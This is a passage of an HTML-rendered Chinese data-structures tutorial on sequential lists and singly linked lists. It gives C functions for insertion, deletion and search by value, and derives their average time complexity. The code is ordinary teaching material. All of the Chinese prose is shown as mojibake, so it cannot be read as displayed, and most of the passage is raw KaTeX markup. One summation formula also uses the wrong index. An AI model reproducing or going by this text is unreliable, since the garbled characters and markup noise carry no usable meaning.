class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.7693300000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.0787820000000004em;vertical-align:-1.277669em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011130000000004em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">âˆ‘</span></span></span><span style="top:-4.300005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.113em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.00744em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>â€‹å› æ­¤ï¼Œé¡ºåºè¡¨åˆ é™¤ç®—æ³•çš„å¹³å‡æ—¶é—´å¤æ‚åº¦ä¸º O (n)ã€‚</p><p>â€‹å¯è§ï¼Œé¡ºåºè¡¨ä¸­æ’å…¥å’Œåˆ é™¤æ“ä½œçš„æ—¶é—´ä¸»è¦è€—è´¹åœ¨ç§»åŠ¨å…ƒç´ ä¸Šï¼Œè€Œç§»åŠ¨å…ƒç´ çš„ä¸ªæ•°å–å†³äºæ’å…¥å’Œåˆ é™¤å…ƒç´ çš„ä½ç½®ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/b4d0a24ce1ac49b0b8cf4977635110b3.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="3-æŒ‰å€¼æŸ¥æ‰¾é¡ºåºæŸ¥æ‰¾"><a class="markdownIt-Anchor" href="#3-æŒ‰å€¼æŸ¥æ‰¾é¡ºåºæŸ¥æ‰¾">#</a> ï¼ˆ3ï¼‰ã€æŒ‰å€¼æŸ¥æ‰¾ï¼ˆé¡ºåºæŸ¥æ‰¾ï¼‰</h3><p>â€‹åœ¨é¡ºåºè¡¨ L ä¸­æŸ¥æ‰¾ç¬¬ä¸€ä¸ªå…ƒç´ å€¼ç­‰äº e çš„å…ƒç´ ï¼Œå¹¶è¿”å›å…¶ä½åºã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 50</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> data[MaxSize];</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">&#125; SqList;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ListInsert</span><span class="params">(SqList *L,<span class="type">int</span> i , <span class="type">int</span> e)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">ListDelete</span><span class="params">(SqList *L,<span class="type">int</span> i , <span class="type">int</span> *e)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">LocateElem</span><span class="params">(SqList *L,<span class="type">int</span> e)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    SqList L;</span><br><span class="line">    <span class="type">int</span> e,index;</span><br><span class="line">    L.length = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)&#123;</span><br><span class="line">        L.data[i] = i + <span class="number">1</span>;</span><br><span class="line">        L.length += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ListInsert(&amp;L,<span class="number">4</span>,<span class="number">10</span>);</span><br><span class="line">    ListDelete(&amp;L,<span class="number">4</span>,&amp;e);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; L.length; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,L.data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%d&quot;</span>,e);</span><br><span class="line">    index = LocateElem(&amp;L,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%d&quot;</span>,index);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ListInsert</span><span class="params">(SqList *L,<span class="type">int</span> i , <span class="type">int</span> e)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span> || i &gt; L-&gt;length + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (L-&gt;length &gt;= MaxSize)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = L-&gt;length;j &gt;= i;j--)</span><br><span class="line">        L-&gt;data[j] = L-&gt;data[j<span class="number">-1</span>];</span><br><span class="line">    L-&gt;data[i - <span class="number">1</span>] = e;</span><br><span class="line">    L-&gt;length ++;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ListDelete</span><span class="params">(SqList *L,<span class="type">int</span> i , <span class="type">int</span> *e)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span> || i &gt; L-&gt;length)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    *e = L-&gt;data[i<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = i;j&lt;L-&gt;length;j++)</span><br><span class="line">        L-&gt;data[j<span class="number">-1</span>] = L-&gt;data[j];</span><br><span class="line">    L-&gt;length--;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°æŒ‰å€¼æŸ¥æ‰¾ç®—æ³•çš„ä¸»ä½“å‡½æ•°</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">LocateElem</span><span class="params">(SqList *L,<span class="type">int</span> e)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; L-&gt;length;i++)</span><br><span class="line">        <span class="keyword">if</span> (L-&gt;data[i] == e)</span><br><span class="line">            <span class="keyword">return</span> i + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹æœ€å¥½æƒ…å†µï¼šæŸ¥æ‰¾åˆ°å…ƒç´ åœ¨è¡¨å¤´ï¼Œä»…éœ€æ¯”è¾ƒä¸€æ¬¡ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O (1)ã€‚</p><p>â€‹æœ€åæƒ…å†µï¼šæŸ¥æ‰¾åˆ°å…ƒç´ åœ¨è¡¨å°¾ï¼ˆæˆ–ä¸å­˜åœ¨ï¼‰ï¼Œéœ€è¦æ¯”è¾ƒ n æ¬¡ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O (n)ã€‚</p><p>â€‹å¹³å‡æƒ…å†µï¼šå‡è®¾ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">p_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ï¼ˆ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn><mi mathvariant="normal">/</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">p_i=1/n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">/</span><span class="mord mathnormal">n</span></span></span></span>ï¼‰æ˜¯æŸ¥æ‰¾åˆ°å…ƒç´ åœ¨ç¬¬ i (1 &lt;= i &lt;L.length) ä¸ªä½ç½®ä¸Šçš„æ¦‚ç‡ï¼Œåˆ™é•¿åº¦ä¸º n çš„çº¿æ€§è¡¨ä¸­æŸ¥æ‰¾å€¼ä¸º e çš„å…ƒç´ æ‰€éœ€æ¯”è¾ƒå¤šå¹³å‡æ¬¡æ•°ä¸º ï¼š</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><munderover><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msub><mi>p</mi><mi>i</mi></msub><mo>Ã—</mo><mi>i</mi><mo>=</mo><munderover><mo>âˆ‘</mo><mrow><mi>n</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mfrac><mn>1</mn><mi>n</mi></mfrac><mo>Ã—</mo><mi>i</mi><mo>=</mo><mfrac><mn>1</mn><mi>n</mi></mfrac><mfrac><mrow><mi>n</mi><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><mn>2</mn></mfrac><mo>=</mo><mfrac><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\sum_{i=1}^{n}p_i\times i=\sum_{n=1}^{n}\frac{1}{n}\times i=\frac{1}{n}\frac{n(n+1)}{2}=\frac{n+1}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">âˆ‘</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.9185100000000004em;vertical-align:-1.267113em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.882887em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">âˆ‘</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.267113em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.113em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.00744em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>â€‹å› æ­¤ï¼Œé¡ºåºè¡¨æŒ‰å€¼æŸ¥æ‰¾ç®—æ³•çš„å¹³å‡æ—¶é—´å¤æ‚åº¦ä¸º O (n)ã€‚</p><h1 id="23-çº¿æ€§è¡¨çš„é“¾å¼è¡¨ç¤º"><a class="markdownIt-Anchor" href="#23-çº¿æ€§è¡¨çš„é“¾å¼è¡¨ç¤º">#</a> 2.3ã€çº¿æ€§è¡¨çš„é“¾å¼è¡¨ç¤ºï¼š</h1><p>â€‹é“¾å¼å­˜å‚¨çº¿æ€§è¡¨æ—¶ï¼Œä¸éœ€è¦ä½¿ç”¨åœ°å€è¿ç»­çš„å­˜å‚¨å•å…ƒï¼Œå³ä¸è¦æ±‚é€»è¾‘ä¸Šç›¸é‚»çš„å…ƒç´ åœ¨ç‰©ç†ä½ç½®ä¸Šä¹Ÿç›¸é‚»ï¼Œå®ƒé€šè¿‡ â€œé“¾â€ å»ºç«‹èµ·å…ƒç´ ä¹‹é—´çš„é€»è¾‘å…³ç³»ï¼Œå› æ­¤æ’å…¥å’Œåˆ é™¤æ“ä½œä¸éœ€è¦ç§»åŠ¨å…ƒç´ ï¼Œè€Œåªéœ€ä¿®æ”¹æŒ‡é’ˆï¼Œä½†ä¹Ÿä¼šå¤±å»é¡ºåºè¡¨å¯éšæœºå­˜å–çš„ä¼˜ç‚¹ã€‚</p><h2 id="231-å•é“¾è¡¨çš„å®šä¹‰"><a class="markdownIt-Anchor" href="#231-å•é“¾è¡¨çš„å®šä¹‰">#</a> 2.3.1ã€å•é“¾è¡¨çš„å®šä¹‰ï¼š</h2><p>â€‹çº¿æ€§è¡¨çš„é“¾å¼å­˜å‚¨åˆç§°å•é“¾è¡¨ï¼Œå®ƒæ˜¯æŒ‡é€šè¿‡ä¸€ç»„ä»»æ„çš„å­˜å‚¨å•ä½æ¥å­˜å‚¨çº¿æ€§è¡¨ä¸­çš„æ•°æ®å…ƒç´ ã€‚ä¸ºäº†å»ºç«‹æ•°æ®å…ƒç´ ä¹‹é—´çš„çº¿æ€§å…³ç³»ï¼Œå¯¹æ¯ä¸ªé“¾è¡¨ç»“ç‚¹ï¼Œé™¤å­˜æ”¾å…ƒç´ è‡ªèº«çš„ä¿¡æ¯å¤–ï¼Œè¿˜éœ€å­˜æ”¾ä¸€ä¸ªæŒ‡å‘å…¶åç»§çš„æŒ‡é’ˆã€‚å•é“¾è¡¨ç»“ç‚¹ä¸€èˆ¬å­˜æ”¾ä¸¤ä¸ªåŸŸï¼Œä¸€ä¸ªæ—¶ data æ•°æ®åŸŸï¼Œç”¨äºå­˜æ”¾æ•°æ®ï¼›å¦ä¸€ä¸ª next ä¸ºæŒ‡é’ˆåŸŸï¼Œç”¨äºå­˜æ”¾åç»§ç»“ç‚¹çš„åœ°å€ã€‚</p><p>â€‹å•é“¾è¡¨ä¸­ç»“ç‚¹ç±»å‹çš„æè¿°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> &#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br></pre></td></tr></table></figure><p>â€‹åˆ©ç”¨å•é“¾è¡¨å¯ä»¥è§£å†³é¡ºåºè¡¨éœ€è¦å¤§é‡è¿ç»­å­˜å‚¨å•å…ƒçš„ç¼ºç‚¹ï¼Œä½†å•é“¾è¡¨é™„åŠ æŒ‡é’ˆåŸŸï¼Œä¹Ÿå­˜åœ¨æµªè´¹å­˜å‚¨ç©ºé—´çš„ç¼ºç‚¹ã€‚ç”±äºå•é“¾è¡¨çš„å…ƒç´ ç¦»æ•£åœ°åˆ†å¸ƒåœ¨å­˜å‚¨ç©ºé—´ä¸­ï¼Œæ‰€ä»¥å•é“¾è¡¨æ˜¯ééšæœºå­˜å–çš„å­˜å‚¨ç»“æ„ï¼Œå³ä¸èƒ½ç›´æ¥æ‰¾åˆ°è¡¨ä¸­æŸä¸ªç‰¹å®šçš„ç»“ç‚¹ã€‚æŸ¥æ‰¾æŸä¸ªç‰¹å®šçš„æ¥å¾…ä½ æ—¶ï¼Œéœ€è¦ä»å¤´å¼€å§‹éå†ï¼Œä¾æ¬¡æŸ¥æ‰¾ã€‚</p><p>â€‹é€šå¸¸ç”¨å¤´æŒ‡é’ˆæ¥è¡¨ç¤ºä¸€ä¸ªå•é“¾è¡¨ï¼Œå¦‚å•é“¾è¡¨ L ï¼Œå¤´æŒ‡é’ˆä¸º NULL æ—¶è¡¨ç¤ºä¸€ä¸ªç©ºè¡¨ã€‚æ­¤å¤–ï¼Œä¸ºäº†æ“ä½œä¸Šçš„æ–¹ä¾¿ï¼Œåœ¨å•é“¾è¡¨ç¬¬ä¸€ä¸ªç»“ç‚¹ä¹‹å‰é™„åŠ 